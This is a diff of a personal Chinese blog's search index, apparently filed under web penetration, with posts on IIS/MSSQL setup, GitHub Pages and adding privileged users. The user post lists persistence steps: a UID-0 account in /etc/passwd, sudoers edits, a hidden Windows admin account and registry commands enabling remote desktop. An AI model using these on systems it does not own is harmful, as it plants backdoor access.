+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre>
+
+<p>关闭：</p>
+<pre class="highlight"><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>随记</tag>
       </tags>
   </entry>
   <entry>
@@ -1161,65 +1154,54 @@
       </tags>
   </entry>
   <entry>
-    <title>添加用户并提权</title>
-    <url>/article/703195e5.html</url>
-    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
-<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
-
-
-
-<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
-<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
-
-<p>b、然后修改用户，使其属于root组</p>
-<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
-
-<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
-<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
-<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
-
-<p>b、使用test账号登录，即可使用sudo权限操作</p>
-<p>如：sudo ls</p>
-<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
-<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
-
-<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
-<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
-
-
-
-<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
-
-
-
-<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
-
-
-
-<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
-
-
-
-<p>查看管理员组成员</p>
-<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
-
-
-
-<p>删除用户</p>
-<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
-
-
-
-<p>禁用用户/启用用户</p>
-<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
-
+    <title>Windows搭建IIS + mssql</title>
+    <url>/article/ddd2791b.html</url>
+    <content><![CDATA[<h1 id="一、搭建IIS服务"><a href="#一、搭建IIS服务" class="headerlink" title="一、搭建IIS服务"></a>一、搭建IIS服务</h1><h2 id="1、搭建IIS服务"><a href="#1、搭建IIS服务" class="headerlink" title="1、搭建IIS服务"></a>1、搭建IIS服务</h2><p>开始-管理工具-服务器管理器-角色-IIS服务-自定义服务（ASP模块、FTP模块等）</p>
+<h2 id="2、导入ASP网站"><a href="#2、导入ASP网站" class="headerlink" title="2、导入ASP网站"></a>2、导入ASP网站</h2><p>选择网站路径</p>
+<p>修改网站访问端口号</p>
+<h2 id="3、网站配置"><a href="#3、网站配置" class="headerlink" title="3、网站配置"></a>3、网站配置</h2><table>
+<thead>
+<tr>
+<th>报错类型</th>
+<th>做法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>403（无访问主程序）</td>
+<td>修改默认文档，增加index.asp</td>
+</tr>
+<tr>
+<td>500（无法访问文件）</td>
+<td>ASP-启用父路径</td>
+</tr>
+<tr>
+<td>提示未启用32位程序池</td>
+<td>应用程序池-网站-高级设置-32位应用程序池-True</td>
+</tr>
+<tr>
+<td>没有操作权限</td>
+<td>修改www目录权限：  属性-安全-编辑-修改Users权限为完全控制</td>
+</tr>
+</tbody></table>
+<h1 id="安装SQL-Server数据库并导入原有数据库"><a href="#安装SQL-Server数据库并导入原有数据库" class="headerlink" title="安装SQL Server数据库并导入原有数据库"></a>安装SQL Server数据库并导入原有数据库</h1><p>1、winserver2008连接sql server镜像，选择安装（精简功能）</p>
+<p> <img src="/article/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/1.png" class="lozad post-image"></p>
+<p>2、限制数据库权限（从管理员权限降权）</p>
+<p> <img src="/article/2.png" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/2.png" class="lozad post-image"></p>
+<p>3、混合模式，设置密码，添加管理员</p>
+<p> <img src="/article/3.png" alt="3" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/3.png" class="lozad post-image"></p>
+<p>4、后续全部确认即可</p>
+<p>5、新建数据库（testdb）</p>
+<p>6、修改网站数据库配置文件，数据库类型为mssql</p>
+<p>7、替换网站原有数据库</p>
+<p>8、修改网站数据库配置文件</p>
+<p>新增数据库名（testdb）、数据库账号（sa）、数据库密码（***）</p>
+<p>注意：mssql账号为sa</p>
 ]]></content>
       <categories>
-        <category>Web渗透</category>
+        <category>Windows</category>
       </categories>
       <tags>
-        <tag>添加用户</tag>
-        <tag>提权</tag>
+        <tag>IIS</tag>
       </tags>
   </entry>
   <entry>
@@ -1451,6 +1433,68 @@
       </tags>
   </entry>
   <entry>
+    <title>添加用户并提权</title>
+    <url>/article/703195e5.html</url>
+    <content><![CDATA[<h1 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h1><p>需要为管理员权限</p>
+<h1 id="linux环境"><a href="#linux环境" class="headerlink" title="linux环境"></a>linux环境</h1><h2 id="1、创建普通用户"><a href="#1、创建普通用户" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">useradd test	#创建test用户</span><br><span class="line">passwd test		#给test用户设置密码</span><br></pre>
+
+
+
+<h2 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h2><h3 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h3><p>a、修改/etc/sudoers文件，将#去掉</p>
+<pre class="highlight"><span class="line">## Allows people in group wheel to run all commands</span><br><span class="line">%wheel    ALL=(ALL)    ALL</span><br></pre>
+
+<p>b、然后修改用户，使其属于root组</p>
+<pre class="highlight"><span class="line">usermod -g root test</span><br></pre>
+
+<p>c、使用test账号登录，su -切回root，再切回test即为root权限</p>
+<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>a、修改/etc/sudoers文件，找到root并添加</p>
+<pre class="highlight"><span class="line">## Allow root to run any commands anywhere</span><br><span class="line">root    ALL=(ALL)     ALL</span><br><span class="line">test   	ALL=(ALL)     ALL</span><br></pre>
+
+<p>b、使用test账号登录，即可使用sudo权限操作</p>
+<p>如：sudo ls</p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>a、修改/etc/passwd文件，找到添加用户，并修改用户ID为0</p>
+<pre class="highlight"><span class="line">test:x:0:1000::/home/test:/bin/sh</span><br></pre>
+
+<p>b、切换至test用户，输入test密码即可登陆至root账户</p>
+<h2 id="3、删除用户"><a href="#3、删除用户" class="headerlink" title="3、删除用户"></a>3、删除用户</h2><pre class="highlight"><span class="line">userdel -r test		#删除用户及其主目录</span><br></pre>
+
+
+
+<h2 id="注！非交互式shell修改密码"><a href="#注！非交互式shell修改密码" class="headerlink" title="注！非交互式shell修改密码"></a>注！非交互式shell修改密码</h2><pre class="highlight"><span class="line">echo &quot;test:123&quot; | chpasswd</span><br><span class="line"></span><br><span class="line">echo &quot;123&quot; | passwd --stdin &quot;test&quot;</span><br></pre>
+
+
+
+<h1 id="Windows环境"><a href="#Windows环境" class="headerlink" title="Windows环境"></a>Windows环境</h1><h2 id="1、创建普通用户-1"><a href="#1、创建普通用户-1" class="headerlink" title="1、创建普通用户"></a>1、创建普通用户</h2><pre class="highlight"><span class="line">net user test 123456 /add		#添加test用户，密码为12356</span><br><span class="line">net user $test 123456 /add		#添加隐藏test用户，密码为12356</span><br></pre>
+
+
+
+<h2 id="2、添加用户至管理员组"><a href="#2、添加用户至管理员组" class="headerlink" title="2、添加用户至管理员组"></a>2、添加用户至管理员组</h2><pre class="highlight"><span class="line">net localgroup administrators test /add		#添加test用户至管理员组</span><br></pre>
+
+
+
+<p>查看管理员组成员</p>
+<pre class="highlight"><span class="line">net localgroup administrators		#查看管理员组成员</span><br></pre>
+
+
+
+<p>删除用户</p>
+<pre class="highlight"><span class="line">net localgroup administrators test /del		#删除用户</span><br></pre>
+
+
+
+<p>禁用用户/启用用户</p>
+<pre class="highlight"><span class="line">net user test /active:no		#禁用test用户</span><br><span class="line">net user test /active:yes		#启用test用户</span><br></pre>
+
+]]></content>
+      <categories>
+        <category>Web渗透</category>
+      </categories>
+      <tags>
+        <tag>添加用户</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>搭建LAMP环境</title>
     <url>/article/a964a121.html</url>
     <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
@@ -1604,11 +1648,11 @@
 </thead>
 <tbody><tr>
 <td>设置用户名邮箱</td>
-<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#x31;&#54;&#x35;&#x32;&#53;&#54;&#x30;&#x39;&#x33;&#x38;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;">&#x31;&#54;&#x35;&#x32;&#53;&#54;&#x30;&#x39;&#x33;&#x38;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;</a>“</td>
+<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#x31;&#54;&#53;&#x32;&#53;&#x36;&#48;&#57;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#54;&#53;&#x32;&#53;&#x36;&#48;&#57;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>“</td>
 </tr>
 <tr>
 <td>创建SSH密匙</td>
-<td>ssh-keygen -t rsa -C “<a href="mailto:&#x31;&#x36;&#53;&#50;&#x35;&#54;&#48;&#x39;&#51;&#x38;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#x31;&#x36;&#53;&#50;&#x35;&#54;&#48;&#x39;&#51;&#x38;&#x40;&#x71;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>“（全部回车）</td>
+<td>ssh-keygen -t rsa -C “<a href="mailto:&#x31;&#54;&#x35;&#x32;&#53;&#54;&#x30;&#57;&#x33;&#56;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;">&#x31;&#54;&#x35;&#x32;&#53;&#54;&#x30;&#57;&#x33;&#56;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#109;</a>“（全部回车）</td>
 </tr>
 <tr>
 <td>添加密匙</td>
@@ -1616,7 +1660,7 @@
 </tr>
 <tr>
 <td>验证连接</td>
-<td>ssh -T <a href="mailto:&#103;&#x69;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;">&#103;&#x69;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#x6f;&#x6d;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
+<td>ssh -T <a href="mailto:&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#109;">&#x67;&#x69;&#x74;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#109;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
 </tr>
 </tbody></table>
 <h2 id="2、创建Github-Pages仓库"><a href="#2、创建Github-Pages仓库" class="headerlink" title="2、创建Github Pages仓库"></a>2、创建Github Pages仓库</h2><p>Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建</p>
@@ -1671,7 +1715,7 @@
 </tr>
 <tr>
 <td>修改 _config.yml 文件末尾的Deployment 部分</td>
-<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#98;&#46;&#x63;&#111;&#x6d;">&#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#98;&#46;&#x63;&#111;&#x6d;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: maste</td>
+<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#x68;&#117;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: maste</td>
 </tr>
 <tr>
 <td>上传部署</td>
